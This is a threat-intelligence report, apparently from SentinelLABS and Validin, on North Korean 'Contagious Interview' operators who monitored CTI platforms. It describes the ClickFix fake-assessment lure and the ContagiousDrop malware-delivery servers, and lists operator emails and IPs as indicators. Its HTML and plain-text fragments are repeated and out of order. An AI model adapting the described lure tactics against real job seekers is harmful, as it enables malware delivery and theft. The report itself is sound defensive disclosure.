and to protect it against detection and disruption. We observed only sporadic changes of limited scale that did not significantly reduce the infrastructure’s visibility to defenders and threat researchers.</p>\n<p>For example, after searching in Validin for the keyword <code>SkillMaster</code>, which is the title of multiple Contagious Interview websites, the threat actors changed the title of only one site, <code>skillmasteryhub[.]us</code>, from <code>SkillMaster</code> to <code>SkillUp</code> a few hours after the search. This change was not applied to other websites with the same title, such as <code>VidHireHub[.]com</code>.</p>\n<figure id=\"attachment_125913\" aria-describedby=\"caption-attachment-125913\" style=\"width: 795px\" class=\"wp-caption aligncenter\"><a href=\"https://www.sentinelone.com/wp-content/uploads/2025/07/ContInt_Validin_July2025_10.jpg\" target=\"_blank\" rel=\"noopener noreferrer\"><img loading=\"lazy\" decoding=\"async\" class=\"size-full wp-image-125913\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/07/ContInt_Validin_July2025_10.jpg\" alt=\"Website title change on 13 March 2025, as seen in Validin\" width=\"795\" height=\"150\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/07/ContInt_Validin_July2025_10.jpg 795w, https://www.sentinelone.com/wp-content/uploads/2025/07/ContInt_Validin_July2025_10-300x57.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/07/ContInt_Validin_July2025_10-768x145.jpg 768w\" sizes=\"auto, (max-width: 795px) 100vw, 795px\" /></a><figcaption id=\"caption-attachment-125913\" class=\"wp-caption-text\">Website title change on 13 March 2025, as seen in Validin</figcaption></figure>\n<p>Many of the Contagious Interview domains that the threat actors searched for in Validin were <a href=\"https://x.com/Namecheap/status/1902083743902543980\" target=\"_blank\" rel=\"noopener noreferrer\">taken down</a> by their respective registrars shortly after the search activity. Some may have been voluntarily deactivated by the threat actors themselves, likely to avoid seizure or further investigation, particularly if the domains were linked to their operational security. For example, the A DNS record for the domain <code>careerquestion[.]com</code> was removed just a few hours after the threat actors searched for it in Validin and confirmed its association with their operation.</p>\n<p>The lack of systematic changes to their infrastructure, despite the threat actors’ thorough examination of CTI information, suggests several possible explanations.</p>\n<p>Given the continuous success of the campaign in engaging job applicants, the threat actors may be prioritizing maintaining operational readiness and meeting their objectives by rapidly deploying new assets to replace disrupted infrastructure, rather than undertaking large-scale targeted changes. We observed a high rate of new infrastructure deployment by the Contagious Interview threat actors alongside losses of existing infrastructure due to actions by service providers, which supports this assessment.</p>\n<p>There may be internal limitations, such as a lack of a central authoritative command structure or resource constraints affecting their ability to modify infrastructure rapidly and at scale. Additionally, the North Korean regime <a href=\"https://reports.dtexsystems.com/DTEX-Exposing+DPRK+Cyber+Syndicate+and+Hidden+IT+Workforce.pdf\" target=\"_blank\" rel=\"noopener noreferrer\">sets annual earnings quotas</a> for cyber teams, requiring them to self-fund while meeting revenue targets. These quotas likely incentivize operatives to continually seek new income sources, fostering intense competition within teams. As a result, individuals managing only portions of the Contagious Interview infrastructure may make limited changes aimed at evading detection of the infrastructure they oversee, thereby gaining advantages over colleagues, rather than engaging in coordinated, large-scale modifications.</p>\n<h2>Validin Use | New Infrastructure And OPSEC Failures</h2>\n<p>The activity patterns of the <code>info@versusx[.]us</code> account on Validin, which we intentionally kept active over the long term, suggest that the threat actors used the platform not only to monitor for signs of detection related to their existing infrastructure, but also:</p>\n<ul>\n<li aria-level=\"1\">To scout and evaluate new infrastructure prior to purchase, highly likely to determine whether it had been previously reported as malicious. This helps the threat actors avoid acquiring assets already labeled as malicious, which would increase the risk of detection and reduce the effectiveness of their operations once deployed.</li>\n<li aria-level=\"1\">To monitor newly acquired infrastructure throughout its lifecycle for any indicators of detection.</li>\n</ul>\n<p>For instance, on March 25, 2025, we observed the <code>info@versusx[.]us</code> account searching for the domain names <code>hiringassessment[.]net</code>, <code>hiringassessment[.]com</code>, <code>hireassessment[.]com</code>, <code>easyjobinterview[.]org</code>, and <code>screenquestion[.]org</code>. All of these domains were available for purchase at the time. These names align with the recruitment-related themes typically used in Contagious Interview activities.</p>\n<p>The <code>info@versusx[.]us</code> account also searched for multiple domains shortly after they were purchased and continued monitoring them for signs of detection after deploying web content. One example is <code>skillquestions[.]com</code>, which was first queried on March 25, 2025, at 17:33:34 UTC, just minutes before it was registered at 17:41:14 UTC. Additional searches occurred shortly before content was deployed on April 23, 2025, and continued periodically until May 6, 2025. According to Validin data, the <code>skillquestions[.]com</code> website remained operational until at least May 13, 2025, at 20:44:27 UTC.</p>\n<p>Our continuous monitoring of the planning, acquisition, and deployment of new Contagious Interview infrastructure allowed us to identify OPSEC mistakes made by the threat actors throughout the process. We observed multiple instances of such errors, including the unintended exposure of files and directory contents, which indicate poor OPSEC practices during infrastructure deployment and provide further insight into their operations.</p>\n<p>For example, <code>api.release-drivers[.]online</code> was exposing its web root directory, the files it contained, and their associated modification timestamps. This included error logs from a Node.js application stored in <code>/home/relefmwz/api.release-drivers[.]online/</code>, indicating that the threat actors used the username <code>relefmwz</code>. The exposed timestamps provide insight into when the Contagious Interview operators deployed content to the server, allowing us to reconstruct their activity timeline.</p>\n<figure id=\"attachment_125906\" aria-describedby=\"caption-attachment-125906\" style=\"width: 996px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" class=\"wp-image-125906 size-full\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/07/ContInt_Validin_July2025_4.jpg\" alt=\"Exposed web root directory of api.release-drivers[.]online\" width=\"996\" height=\"384\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/07/ContInt_Validin_July2025_4.jpg 996w, https://www.sentinelone.com/wp-content/uploads/2025/07/ContInt_Validin_July2025_4-300x116.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/07/ContInt_Validin_July2025_4-768x296.jpg 768w\" sizes=\"auto, (max-width: 996px) 100vw, 996px\" /><figcaption id=\"caption-attachment-125906\" class=\"wp-caption-text\">Exposed web root directory of <em>api.release-drivers[.]online</em></figcaption></figure>\n<p>Further, several newly deployed ClickFix malware distribution servers, such as <code>api.camdriverhelp[.]club</code> and <code>api.drive-release[.]cloud</code>, were exposing ContagiousDrop applications along with the log files they had generated. These files contain information on affected individuals, allowing us to gain valuable insights into the victimology of the campaigns.</p>\n<h2>ContagiousDrop Applications</h2>\n<p>The ContagiousDrop applications, typically implemented in <code>app.js files</code>, are deployed on ClickFix malware distribution servers such as <code>api.drive-release[.]cloud</code>. These applications run servers that listen on configured ports to handle incoming HTTP GET and POST requests, executing different functions based on the specific request path.</p>\n<p>The ContagiousDrop applications deliver malware disguised as software updates or essential utilities. They distribute a tailored payload based on the victim’s operating system (Windows, macOS, or Linux), system architecture, and method of interaction with the server, such as the use of the <code>curl</code> command.</p>\n<figure id=\"attachment_125904\" aria-describedby=\"caption-attachment-125904\" style=\"width: 540px\" class=\"wp-caption aligncenter\"><a href=\"https://www.sentinelone.com/wp-content/uploads/2025/07/ContInt_Validin_July2025_7.jpg\" target=\"_blank\" rel=\"noopener noreferrer\"><img loading=\"lazy\" decoding=\"async\" class=\"size-full wp-image-125904\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/07/ContInt_Validin_July2025_7.jpg\" alt=\"Operating system-specific malware delivery\" width=\"540\" height=\"203\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/07/ContInt_Validin_July2025_7.jpg 540w, https://www.sentinelone.com/wp-content/uploads/2025/07/ContInt_Validin_July2025_7-300x113.jpg 300w\" sizes=\"auto, (max-width: 540px) 100vw, 540px\" /></a><figcaption id=\"caption-attachment-125904\" class=\"wp-caption-text\">Operating system-specific malware delivery</figcaption></figure>\n<p>In addition to delivering malware, the ContagiousDrop applications feature an integrated email notification system. These notifications, sent from a configured email address such as <code>designedcuratedamy58[@]gmail.com</code>, provide the Contagious Interview threat actors with insights into victim engagement and interaction patterns and are delivered to their configured recipient addresses. For example, an email is triggered when an affected individual starts a fake skill assessment or executes a <code>curl</code> command to download a file from the ClickFix malware distribution server.</p>\n<figure id=\"attachment_125912\" aria-describedby=\"caption-attachment-125912\" style=\"width: 504px\" class=\"wp-caption aligncenter\"><a href=\"https://www.sentinelone.com/wp-content/uploads/2025/07/ContInt_Validin_July2025_11.jpg\" target=\"_blank\" rel=\"noopener noreferrer\"><img loading=\"lazy\" decoding=\"async\" class=\"size-full wp-image-125912\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/07/ContInt_Validin_July2025_11.jpg\" alt=\"Email notification recipients\" width=\"504\" height=\"350\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/07/ContInt_Validin_July2025_11.jpg 504w, https://www.sentinelone.com/wp-content/uploads/2025/07/ContInt_Validin_July2025_11-300x208.jpg 300w\" sizes=\"auto, (max-width: 504px) 100vw, 504px\" /></a><figcaption id=\"caption-attachment-125912\" class=\"wp-caption-text\">Email notification recipients</figcaption></figure>\n<p>Furthermore, these applications record victim information across multiple files and interaction points, effectively building a victimology database and logging victim activities.

In addition to the actors behind the Contagious Interview campaign cluster, SentinelLABS has also observed other North Korean groups demonstrating interest in threat intelligence prior to the activities discussed in this post. In 2024, we <a href=\"https://www.sentinelone.com/labs/a-glimpse-into-future-scarcruft-campaigns-attackers-gather-strategic-intelligence-and-target-cybersecurity-professionals/\" target=\"_blank\" rel=\"noopener noreferrer\">retrieved malware</a> associated with ScarCruft, likely designed to target consumers of threat intelligence reporting, such as threat researchers and other cybersecurity professionals. We suspect the actors aimed to gain insights into non-public CTI and defensive strategies.</p>\n<p>In this post, we disclose indicators and TTPs that enable the sustained tracking of the Contagious Interview threat actors. While we expect them to alter their methods as a result, the expanding scale and broad targeting of these operations suggests greater benefit in empowering the wider public to effectively defend than there is in hoarding actionable intelligence indefinitely. SentinelLABS maintains other methods of tracking these evolving campaigns.</p>\n<p>Based on our observations, the Contagious Interview threat actors do not implement systematic changes to their infrastructure based on the CTI information they consume from multiple sources, which could make their operations harder to detect or disrupt. Despite this, they continue to achieve a relatively high success rate in attracting job seekers through fraudulent employment offers and skill assessment tests. Their operational strategy appears to prioritize promptly replacing infrastructure lost due to takedown efforts by service providers, using newly provisioned infrastructure to sustain their activity.</p>\n<p>Therefore, a critical element in mitigating this threat is the human factor. It is important that job seekers, particularly those within the cryptocurrency sector, exercise heightened vigilance when engaging with employment offers and associated assessments.</p>\n<p>In addition, infrastructure service providers play an important role in disrupting Contagious Interview operations. Continuous and effective actions against the threat actors’ infrastructure can significantly reduce their capacity to carry out attacks. Close collaboration and coordination between service providers and the threat intelligence community are crucial to mitigating the impact of these activities. SentinelLABS and Validin remain committed to sharing timely and actionable threat intelligence to support these collaborative efforts.</p>\n<h2>Indicators of Compromise</h2>\n<p><b>Email Addresses (Contagious Interview Operators)</b></p>\n<div style=\"font-size:0.8em\">\nadmin[@]quickproassess[.]com<br />\nawesomium430[@]gmail.com<br />\nbetosoto2819[@]gmail.com<br />\nbrooksliam534[@]gmail.com<br />\nchris[@]wegrowup[.]us<br />\ndaisukeokitsugu[@]gmail.com<br />\ndenys[@]gmail.com<br />\ndesignedcuratedamy58[@]gmail.com<br />\ndzsignzdcuatzdamy[@]gmail.com<br />\neliteengineer0523[@]gmail.com<br />\nexcellentreporter321[@]gmail.com<br />\nfairdev610[@]gmail.com<br />\nghostmaxim777[@]outlook.com<br />\nhundredup2023[@]gmail.com<br />\nhuzqur023[@]gmail.com<br />\ninfo[@]versusx[.]us<br />\ninvite[@]quiz-nest[.]com<br />\njimmr6587[@]gmail.com<br />\njohnkane84830[@]gmail.com<br />\nlegendaryaladdin[@]motionassess[.]com<br />\nmarvel714jm[@]gmail.com<br />\nmaxwell[@]gmail.com<br />\nmontessantiago9712[@]gmail.com<br />\nmvsolution9[@]gmail.com<br />\nphoenixfire471[@]gmail.com<br />\nrichardkdavis45[@]gmail.com<br />\nrockstar96054[@]gmail.com<br />\nrodriguezjamesdaniel0807[@]gmail.com<br />\nrv882866.hstgr.cloud[@]glitchmedic[.]com<br />\nsinbad[@]hirelytics360[.]com<br />\nthedrgn1011[@]gmail.com<br />\ntrevorgreer9312[@]gmail.com<br />\nyudaiaoyama14[@]gmail.com\n</div>\n<p>&nbsp;<br />\n<b>IP Addresses</b></p>\n<div style=\"overflow-x:auto;

This analysis focuses on the abuse of cyber intelligence platforms by the actors behind the Contagious Interview campaign cluster employing the ClickFix social engineering technique.\nThey operate in coordinated teams with real-time collaboration, likely using Slack and multiple intelligence sources such as Validin, VirusTotal, and Maltrail.\nAlthough aware their infrastructure is detectable, they make only limited changes to reduce detection and disruption risk, while rapidly deploying new infrastructure in response to service provider takedowns.\nThis indicates a strategic focus on continuously replacing disrupted infrastructure with new assets to sustain operations and high victim engagement.\nFactors such as decentralized command and competitive internal incentives may limit the threat actors’ ability to consistently protect existing infrastructure at scale.\nSentinelLABS’ analysis suggests that the threat actors are effective at engaging targets; there were over 230 victims between January and March 2025, with the actual number likely being significantly higher.\nIn partnership with SentinelLABS and Validin, Reuters provides further coverage of the human dimension of this threat, exploring victim engagement methods and their personal impact.\nOverview\nIn collaboration with the internet intelligence platform Validin, SentinelLABS has been tracking activity on the platform which we attribute with high confidence to North Korean threat actors involved in the Contagious Interview campaign cluster. This activity, which took place between March and June 2025, involved the threat actors examining cyber threat intelligence (CTI) information related to their infrastructure. Our unique visibility has provided valuable insights into their operational practices, internal coordination, infrastructure management and deployment, and victimology.\nSentinelLABS continuously tracks North Korean-aligned threat actors, including their persistent interest in cyber threat intelligence. As part of SentinelLABS’ broader efforts to identify and disrupt North Korean operations in collaboration with partner organizations, SentinelLABS and Validin conducted a joint investigation, combining our threat intelligence expertise with Validin’s visibility into the threat actors’ activities on their platform, to better understand these activities and provide actionable intelligence supporting defensive actions.\nSentinelLABS and Validin observed an intensive and coordinated effort by Contagious Interview threat actors to register and use Validin community access accounts within approximately 24 hours after Validin published a blog post on 11 March 2025. The post discusses the infrastructure of Lazarus, a suspected North Korean APT umbrella cluster associated with Contagious Interview activities. Validin’s community access portal provides free access to infrastructure intelligence information.\nThe threat actors used Google Gmail addresses that we had already been tracking as Contagious Interview artifacts at the time of registration. Although Validin blocked the accounts shortly after registration, we observed the threat actors persisting in their efforts to use Validin by creating accounts at later dates. At that point, we intentionally kept one account active over the long term to monitor and gather intelligence on their activities.\nWe observed that the Contagious Interview threat actors engaged in coordinated activity and likely operated in teams to investigate threat intelligence related to their infrastructure and to monitor for signs of detection. Indicators suggest they used multiple indicators of compromise (IOC) repositories and CTI platforms, including Validin, VirusTotal, and Maltrail. We also identified indicators of real-time teamwork, including possible use of the Slack platform to coordinate their investigations.\nDespite thoroughly examining threat intelligence and identifying artifacts that can be used to discover their infrastructure, the threat actors did not implement systematic, large-scale changes to make it harder to detect, thereby reducing its exposure to discovery and disruption. Instead, we observed only sporadic, limited-scale changes targeting specific artifacts used to identify Contagious Interview infrastructure, while the threat actors rapidly deployed new infrastructure in response to service provider takedowns.\nThis may reflect a focus on investing resources to maintain operational readiness and sustain the campaign’s high volume of victim engagement by deploying new infrastructure rather than undertaking broad modifications to protect existing infrastructure. Based on log files unintentionally exposed on several Contagious Interview servers, we identified over 230 individuals affected during the period from January to March 2025, though the actual number is likely much higher.\nGiven the continuous success of their campaigns in engaging targets, it may be more pragmatic and efficient for the threat actors to deploy new infrastructure rather than maintain existing assets. Potential internal factors, such as decentralized command structures or operational resource constraints, may restrict their capacity to rapidly implement coordinated changes. Moreover, competitive pressures stemming from North Korea’s annual revenue quotas for cyber teams likely incentivize operatives to make isolated adjustments to the infrastructure under their control in order to protect their own assets and outperform colleagues, rather than participate in centrally coordinated, large-scale updates.\nThe threat actors also used Validin to scout and evaluate new infrastructure before acquisition, likely aiming to avoid assets previously flagged as malicious, which would increase detection risk and reduce operational effectiveness once deployed. Following acquisition, they continued to monitor their assets for signs of detection throughout their lifecycle. We were closely monitoring Contagious Interview infrastructure during its acquisition and deployment, which revealed repeated OPSEC failures, suggesting a lack of consistent operational security controls during the infrastructure setup phase.\nBackground | Contagious Interview and ClickFix\nFirst used in 2023 to label a campaign targeting job seekers, the term Contagious Interview has since been used interchangeably in other contexts, including to refer to an APT group assessed to be a subset of the North Korean umbrella group Lazarus.\nIn this post, we use Contagious Interview to refer to a cluster of campaigns, variants of the 2023 campaign, that target job applicants using diverse social engineering tactics to trick targets into executing malware.\nContagious Interview activities predominantly target individuals active in the cryptocurrency industry, aiming to gain access to their systems for various purposes, including intelligence collection and the theft of cryptocurrency assets. This supports North Korea’s efforts in evading sanctions and generating illicit revenue for financing its projects, including missile programmes.\nContagious Interview campaigns have been typically associated with the umbrella threat cluster Lazarus. DTEX Systems has attributed these campaigns to a group referred to as Gwisin Gang, which likely emerged from an IT organization whose subordination within the North Korean state apparatus is still subject to assessment.\nRecent Contagious Interview campaigns, also referred to as ClickFake Interview, involve a social engineering technique known as ClickFix. We assess that the threat actors whose activities are discussed in this post are involved in these campaigns.\nClickFix typically proceeds as follows. A targeted job seeker receives an invitation to participate in a job application process, directing them to a lure website where they are prompted to complete a skill assessment. During the assessment, the applicant encounters a fabricated error message, such as a camera access issue. They are then instructed to copy and paste command lines, often involving utilities like curl, to download and execute a supposed update from a separate malware distribution server, unknowingly deploying malware in the process. This technique is discussed in more detail in previous research.\nAccount Registrations | Initial Activities\nThe threat actors started creating Validin community accounts on 12 March 2025 at 22:44:11 UTC, an activity which spanned a relatively short interval of approximately 15 minutes, suggesting a concentrated and coordinated approach. We present below the email addresses used for account registrations as well as the IP addresses from which the registrations were conducted. We attribute this activity to Contagious Interview threat actors based on multiple indicators.\nEmail Address\nIP Address\n\n\njimmr6587[@]gmail.com\n38.170.181[.]10\n\n\nexcellentreporter321[@]gmail.com\n194.33.45[.]162\n\n\nrockstar96054[@]gmail.com\n96.62.127[.]126\n\n\nrichardkdavis45[@]gmail.com\n45.86.208[.]162\n\n\nfairdev610[@]gmail.com\n70.39.70[.]194\n\n\nmarvel714jm[@]gmail.com\n77.247.126[.]189\n\n\nmontessantiago9712[@]gmail.com\n38.170.181[.]10\n\n\nhundredup2023[@]gmail.com\n70.32.3[.]15\n\n\nhuzqur023[@]gmail.com\n89.19.58[.]51\n\n\n\n\nA significant portion of the IP addresses used for registration, such as 194.33.45[.]162, 70.39.70[.]194, 70.32.3[.]15, 38.170.181[.]10, and 45.86.208[.]162, have been associated with Astrill VPN, a VPN service popular among North Korean threat clusters.\nAdditionally, even before the account registrations, SentinelLABS and Validin were already tracking the email addresses fairdev610[@]gmail.com, richardkdavis45[@]gmail.com, rockstar96054[@]gmail.com, excellentreporter321[@]gmail.com, and hundredup2023[@]gmail.com as Contagious Interview artifacts. We found these addresses in unintentionally exposed JavaScript scripts (Node.js applications) on Contagious Interview ClickFix malware distribution servers.\nWe have been tracking these Node.js applications under the ContagiousDrop moniker since their initial exposure. Typically implemented as app.js files, the applications distribute malware to targeted individuals and notify the threat actors via email about victim engagement. This engagement includes information submission to Contagious Interview lure websites and the execution of commands, such as curl, as directed by the threat actors as part of the ClickFix social engineering tactic. A ContagiousDrop sample is highlighted in previous research on Contagious Interview activity published in April 2025. These applications will be discussed in greater detail later in this blog post.\nMoreover, some email addresses have been used for registering Contagious Interview domains pointing to lure websites. For example, marvel714jm[@]gmail.com and jimmr6587[@]gmail.com have been used to register the paxos-video-interview[.]com and skill-share[.]org domains, respectively.\nFinally, some email addresses were used to register Validin accounts from IP addresses that were also used to register or log in to accounts with other email addresses we attribute with high confidence to Contagious Interview. For example, the account montessantiago9712[@]gmail.com was registered from the IP address 38.170.181[.]10, the same as jimmr6587[@]gmail.com.\nApproximately 15 minutes after the first observed account registration, Validin blocked the Contagious Interview accounts and subsequently prevented further community registrations originating from known Astrill VPN IP addresses or using Gmail accounts.\nAccount Registrations | Further Activities\nAfter likely realizing that their access to Validin had been blocked, Contagious Interview threat actors attempted to register community accounts again on 25 March 2025 (13 days after the initial registration activity) and 26 April 2025. This time, they also used non-Gmail email addresses, most likely in response to Validin blocking Gmail-based registrations: info[@]versusx[.]us and invite[@]quiz-nest[.]com. We present below the email addresses used for Validin account registrations, along with the date, time, and originating IP addresses of these registrations.\nEmail Address\nDate (UTC)\nTime (UTC)\nIP Address\n\n\ninfo[@]versusx[.]us\n2025-03-25\n13:33:01\n181.59.180[.]84\n\n\nmvsolution9[@]gmail.com\n2025-04-26\n16:48:54\n181.215.9[.]29\n\n\ninvite[@]quiz-nest[.]com\n2025-04-26\n16:51:29\n181.215.9[.]29\n\n\n\n\nThe domain registration records for versusx[.]us include the email address brooksliam534[@]gmail.com, which has also been used to register several Contagious Interview domains discussed in previous research, such as willotalent[.]us and nvidia-release[.]us. Additionally, indicators suggest that the brooksliam534[@]gmail.com account has been involved in publishing malicious npm (Node Package Manager) packages (cors-app and cors-parser) as part of a software supply chain campaign attributed to Contagious Interview threat actors.\nThe liambrooksman persona (brooksliam534[@]gmail.com) tracked as maintainer of cors-app and cors-parser\nWe observed the registration of invite[@]quiz-nest[.]com approximately two minutes after the threat actors attempted to register mvsolution9[@]gmail.com. The registration of mvsolution9[@]gmail.com failed due to measures Validin implemented following the March 2025 account registration activities. Both actions originated from the same IP address, 181.215.9[.]29, suggesting the involvement of a single operator.\nmvsolution9[@]gmail.com has been used to register two Contagious Interview domains: evalassesso[.]com, which Sekoia has also attributed to Contagious Interview, and speakure[.]com. The quiz-nest[.]com website, at least up to 24 May 2025, was implemented in a manner typical of Contagious Interview lure websites.\nWe also observed login attempts on 9 May 2025 using the excellentreporter321[@]gmail.com and marvel714jm[@]gmail.com accounts, which had been blocked by Validin in March 2025.\nThe threat actors’ shift to using non-Gmail addresses, along with their continuous attempts to bypass Validin’s access controls, highlights their adaptability and persistent interest in Validin data. Recognizing their persistence in obtaining community access, we intentionally kept only the info[@]versusx[.]us account active to monitor subsequent activity, determine their objectives, and gather further intelligence. Since then, the Contagious Interview threat actors have continued attempting to register new Validin accounts through the time of writing this post.\nAccount Registrations | Personas\nIn accordance with Validin’s policy for community accounts, the Contagious Interview actors completed registration forms requesting information such as full name, affiliation, and reason for registration.\nAccount\nFull Name\nAffiliation\nReason\n\n\nexcellentreporter321[@]gmail.com\nAndress Victor Pabon Carrascal\nDAG\nFind My Platform.\n\n\nfairdev610[@]gmail.com\nFair Dev\nTalents Vision\nReference\n\n\nhundredup2023[@]gmail.com\nThomas Mitchell\nBaymax\nto find domain\n\n\nhuzqur023[@]gmail.com\nHamza\nStarlink\nI will use this for phishing check\n\ninfo[@]versusx[.]us\nNoraida\nVersusx\nResearch\n\ninvite[@]quiz-nest[.]com\nAnika Larkin\nQuiz Nest\nGoogle\n\n\njimmr6587[@]gmail.com\njimmr\nIndividual\nGithub\n\nmarvel714jm[@]gmail.com\nMar Vel\nPaxos\nValisin\n\n\nmontessantiago9712[@]gmail.com\nSantiago Montes\nPersonal\nVirus Checker\n\nmvsolution9[@]gmail.com\nAnika Larkin\nTest\nGgle\n\n\nrichardkdavis45[@]gmail.com\nRichard Davis\nCreatDao\n/\n\nrockstar96054[@]gmail.com\nRock Lee\nFWW\nGoogling\n\n\n\nThe threat actors used a diverse range of names, from generic handles like jimmr to pop-culture references such as Rock Lee (a character from the Japanese anime series Naruto), Mar Vel (likely referring to Mar-Vell, a Captain Marvel character from Marvel Comics), and Santiago Montes (the main protagonist of the animated television series Santiago of the Seas), as well as more elaborate, seemingly legitimate full names like Andress Victor Pabon Carrascal. The reuse of the name Anika Larkin for two different accounts, invite[@]quiz-nest[.]com and mvsolution9[@]gmail.com, combined with both accounts being registered from the same IP address (181.215.9[.]29) within approximately two minutes, suggests the involvement of a single individual.\nSome affiliations correspond to fake hiring platforms operated by Contagious Interview. For example, Quiz Nest aligns with the domain quiz-nest[.]com, while Paxos corresponds to domains such as paxos-video-interview[.]com and paxosassessments[.]com. The account marvel714jm[@]gmail.com, which used the Paxos affiliation, was also used to register the domain paxos-video-interview[.]com. This suggests the actors leveraged their own infrastructure and fabricated brands to create a more convincing facade of legitimacy.\nIn addition to these fake platforms, the threat actors also used names of legitimate, well-known companies such as Starlink, as well as vague descriptors like Individual or Personal.\nSome of the stated reasons for registration provide direct insight into the threat actors’ primary objective: investigating threat intelligence information related to their infrastructure. For example, pretexts such as Research,  To find domain, and Find My Platform indicate their interest in exploring Validin’s data.\nValidin Use | Activity Across Multiple Platforms\nThe majority of accounts began using the Validin platform immediately after registration. In total, we observed 57 unique search terms across all categories supported by the platform, including domain names, hashes, URLs, web metadata, keywords, and IP addresses.\nThe threat actors did not search for any IOCs reported in Validin’s blog post, which we suspect triggered their initial interest in the platform. Therefore, we assess the post only brought Validin to their attention, after which they integrated Validin into a broader workflow for investigating threat intelligence related to their operations by leveraging multiple sources.\nWe observed indicators suggesting that the threat actors used additional IOC repositories and platforms alongside Validin to conduct comprehensive investigations. These included VirusTotal and the apt_lazarus.txt file, which is part of the Maltrail project and publicly available on GitHub. This file is regularly updated with domain names, IP addresses, and URLs attributed to the Lazarus umbrella APT cluster, as well as sources providing attribution information or context, such as social media, blog posts, and other threat intelligence platforms (including VirusTotal and Validin). VirusTotal is a malware analysis service and threat intelligence platform that aggregates detection results, reputation assessments, and contextual information for files, URLs, domains, and IP addresses from a wide range of detection engines, third-party tools, and its user community.\nThe very first search term used by the threat actors was the keyword TalentCheck, entered on 12 March 2025 at 22:44:40 UTC. TalentCheck is the title of multiple Contagious Interview websites, including skillcheck[.]pro, talentcheck[.]pro, and vidassesspro[.]com. The keyword was first published as an artifact identifying Contagious Interview websites approximately one day earlier by Maltrail in apt_lazarus.txt, on 11 March 2025 at 11:18:22 UTC. This suggests that the threat actors likely used Validin to investigate what additional information the platform could provide based on the TalentCheck keyword they first observed in apt_lazarus.txt.\nTalentCheck in apt_lazarus.txt\nMost of the search terms the threat actors used in Validin had been published exclusively in apt_lazarus.txt at the time of the search and were queried shortly after their appearance in the file, sometimes within less than an hour. This supports our assessment that the Contagious Interview actors closely monitored apt_lazarus.txt and used Validin to gather further details and contextual information.\nIn addition to Maltrail, we suspect that the Contagious Interview threat actors also use VirusTotal, or monitor what information about their infrastructure and malware is available on the platform, in conjunction with Validin. For example, the account richardkdavis45[@]gmail.com queried Validin for the URL https[://]robinhood[.]evalvidz[.]com/invite/fZ6j8A2k on 12 March 2025 at 22:59:20 UTC, just a few minutes after the exact same URL was first submitted to VirusTotal at 22:54:24 UTC.\nBased on log files, we were able to reconstruct the exact navigation paths of the Contagious Interview threat actors within Validin. We observed a strong interest in external references that provide attribution information for specific search terms, which Validin displays in the Reputation Factors panel on the search results page. For most of the domains they searched, the threat actors visited every available external reference, demonstrating a determined effort to conduct thorough CTI investigations by gathering information from multiple sources.\nReconstructed navigation path of the jimmr6587[@]gmail.com account\nValidin Use | Team Collaboration\nWe observed multiple accounts searching for the same terms within a very short time frame, indicating a coordinated and collaborative effort involving multiple individuals. In addition, we identified strong indicators that the threat actors were using Slack, a messaging platform commonly used for team communication and collaboration, to coordinate their activities.\nWhen investigating patterns of account activity and search behavior using Validin log data, we observed that the jimmr6587[@]gmail.com account was the first to search for the domain webcamfixer[.]online on 12 March 2025 at 22:54:19 UTC, followed by excellentreporter321[@]gmail.com (22:55:17 UTC), rockstar96054[@]gmail.com (22:55:25 UTC), richardkdavis45[@]gmail.com (22:55:43 UTC), and fairdev610[@]gmail.com (22:55:55 UTC).\nOur cross-examination of web server log data revealed that the search by jimmr6587[@]gmail.com was followed by requests to Validin from Slack Robots for the same URL generated by the search (/detail?type=dom&find=webcamfixer[.]online). Slack Robots retrieve web content when a user posts a URL in a channel or direct message, displaying summary information such as the page title, meta description, and a preview image.\nThese Slack Bot requests were followed by requests to the same URL from the IP addresses from which the accounts excellentreporter321[@]gmail.com, rockstar96054[@]gmail.com, richardkdavis45[@]gmail.com, and fairdev610[@]gmail.com had logged in. The timing of these requests aligns with each account’s respective search for webcamfixer[.]online as recorded in Validin logs.\nWeb server log data\nThis suggests that the individual operating the jimmr6587[@]gmail.com account searched for webcamfixer[.]online in Validin, pasted the resulting URL into Slack, and that the individuals behind the other accounts subsequently clicked on the shared link in quick succession.\nValidin Use | Limited Infrastructure Changes\nDespite thoroughly investigating CTI information and identifying artifacts that could be used to discover their infrastructure, we did not observe any systematic or widespread actions by the Contagious Interview threat actors to make their infrastructure more difficult to discover and to protect it against detection and disruption. We observed only sporadic changes of limited scale that did not significantly reduce the infrastructure’s visibility to defenders and threat researchers.\nFor example, after searching in Validin for the keyword SkillMaster, which is the title of multiple Contagious Interview websites, the threat actors changed the title of only one site, skillmasteryhub[.]us, from SkillMaster to SkillUp a few hours after the search. This change was not applied to other websites with the same title, such as VidHireHub[.]com.\nWebsite title change on 13 March 2025, as seen in Validin\nMany of the Contagious Interview domains that the threat actors searched for in Validin were taken down by their respective registrars shortly after the search activity. Some may have been voluntarily deactivated by the threat actors themselves, likely to avoid seizure or further investigation, particularly if the domains were linked to their operational security. For example, the A DNS record for the domain careerquestion[.]com was removed just a few hours after the threat actors searched for it in Validin and confirmed its association with their operation.\nThe lack of systematic changes to their infrastructure, despite the threat actors’ thorough examination of CTI information, suggests several possible explanations.\nGiven the continuous success of the campaign in engaging job applicants, the threat actors may be prioritizing maintaining operational readiness and meeting their objectives by rapidly deploying new assets to replace disrupted infrastructure, rather than undertaking large-scale targeted changes. We observed a high rate of new infrastructure deployment by the Contagious Interview threat actors alongside losses of existing infrastructure due to actions by service providers, which supports this assessment.\nThere may be internal limitations, such as a lack of a central authoritative command structure or resource constraints affecting their ability to modify infrastructure rapidly and at scale. Additionally, the North Korean regime sets annual earnings quotas for cyber teams, requiring them to self-fund while meeting revenue targets. These quotas likely incentivize operatives to continually seek new income sources, fostering intense competition within teams. As a result, individuals managing only portions of the Contagious Interview infrastructure may make limited changes aimed at evading detection of the infrastructure they oversee, thereby gaining advantages over colleagues, rather than engaging in coordinated, large-scale modifications.\nValidin Use | New Infrastructure And OPSEC Failures\nThe activity patterns of the info@versusx[.]us account on Validin, which we intentionally 